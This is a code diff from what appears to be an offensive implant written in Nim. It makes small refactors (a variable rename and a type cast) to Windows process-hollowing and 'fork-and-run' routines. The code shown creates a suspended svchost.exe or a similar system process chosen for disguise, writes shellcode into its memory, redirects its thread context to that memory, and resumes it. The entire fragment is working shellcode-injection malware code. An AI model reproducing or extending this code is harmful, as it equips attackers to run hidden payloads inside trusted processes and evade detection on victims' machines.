@@ -310,7 +310,7 @@ when defined(windows):
       let dst = cast[LPVOID](cast[int](base) + va)
       discard callWriteProcessMemory(pi.hProcess, dst,
         cast[LPCVOID](unsafeAddr pebytes[rawOff]), SIZE_T(rawSz), addr wr)
-    let ep = cast[uint64](base) + uint64(entryRVA)
+    let ep = DWORD64(cast[uint64](base) + uint64(entryRVA))
     var ctx: CONTEXT
     ctx.ContextFlags = CONTEXT_CONTROL
     if callGetThreadContext(pi.hThread, addr ctx) != 0:
@@ -324,21 +324,21 @@ when defined(windows):
 
   # ── Fork-and-run (shellcode in sacrificial process) ──────────────────────────
   proc doForkRun(cmd: string; sc: seq[byte]): string =
-    var proc_ = cmd
-    if proc_.len == 0:
+    var procPath = cmd
+    if procPath.len == 0:
       let sys = getEnvCmd("SystemRoot", "C:\\Windows")
-      proc_ = sys & "\\System32\\svchost.exe"
+      procPath = sys & "\\System32\\svchost.exe"
       for c in [sys & "\\System32\\RuntimeBroker.exe",
                 sys & "\\System32\\dllhost.exe",
                 sys & "\\System32\\WerFault.exe"]:
-        if fileExists(c): proc_ = c; break
+        if fileExists(c): procPath = c; break
     var si: STARTUPINFOW
     si.cb = DWORD(sizeof(si))
     var pi: PROCESS_INFORMATION
-    var cmdW = newWideCString(proc_)
+    var cmdW = newWideCString(procPath)
     if callCreateProcessW(nil, cmdW, nil, nil, WINBOOL(0), CREATE_SUSPENDED,
                           nil, nil, addr si, addr pi) == 0:
-      return "CreateProcessW(" & proc_ & ") failed (err " & $GetLastError() & ")"
+      return "CreateProcessW(" & procPath & ") failed (err " & $GetLastError() & ")"
     let mem = callVirtualAllocEx(pi.hProcess, nil, SIZE_T(sc.len),
                                   MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
     if mem == nil:
@@ -356,7 +356,7 @@ when defined(windows):
       ctx.Rip = cast[DWORD64](mem)
       discard callSetThreadContext(pi.hThread, addr ctx)
     discard ResumeThread(pi.hThread)
-    let res = "[+] fork-run: " & $sc.len & " B shellcode in " & proc_ &
+    let res = "[+] fork-run: " & $sc.len & " B shellcode in " & procPath &
               " (PID=" & $pi.dwProcessId & ")"
     discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
     return res
